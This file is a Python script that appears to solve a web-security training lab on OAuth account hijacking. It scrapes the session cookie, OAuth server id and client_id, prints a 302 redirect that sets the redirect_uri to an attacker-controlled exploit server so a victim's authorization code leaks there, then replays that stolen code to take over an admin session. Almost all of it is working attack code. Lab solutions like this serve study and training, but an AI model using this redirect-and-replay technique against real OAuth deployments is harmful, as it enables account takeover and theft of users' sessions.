import http.client
import re
import ssl
import urllib.parse

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def GET_social_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/social-login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_oauthcallback(
        authorization_code: str,
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/oauth-callback'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('code', authorization_code),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


response = GET_social_login()
response_body = response.read().decode('utf-8')

print("GET login response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

cookie_header = response.getheader('set-cookie')
session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
oauth_server_id = re.findall(r'oauth-([a-zA-Z0-9]+).oauth-server', response_body)[0]
client_id = re.findall(r'client_id=([a-zA-Z0-9]+)', response_body)[0]
print(f"session: {session}")
print(f"oauth_server_id: {oauth_server_id}")
print(f"client_id: {client_id}")

print("Exploit")
print("======================================")
print("File:")
print("/exploit")
print()
print("Head:")
print(f"""HTTP/1.1 302
Location: https://oauth-{oauth_server_id}.oauth-server.net/auth?client_id={client_id}&redirect_uri=https://exploit-{EXPLOIT_SERVER_ID}.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email""")
print()
print("======================================")
print("""
deliver exploit to victim
victim completes the oauth flow
authorization code is sent to the exploit server
""")

authorization_code = input("authorization code from exploit server's logs: ")

response = GET_oauthcallback(authorization_code, session)
response_body = response.read().decode('utf-8')

print("GET oauth-callback response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

cookie_header = response.getheader('set-cookie')
session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
print(f"session: {session}")
print("set session as browser cookie to become admin")
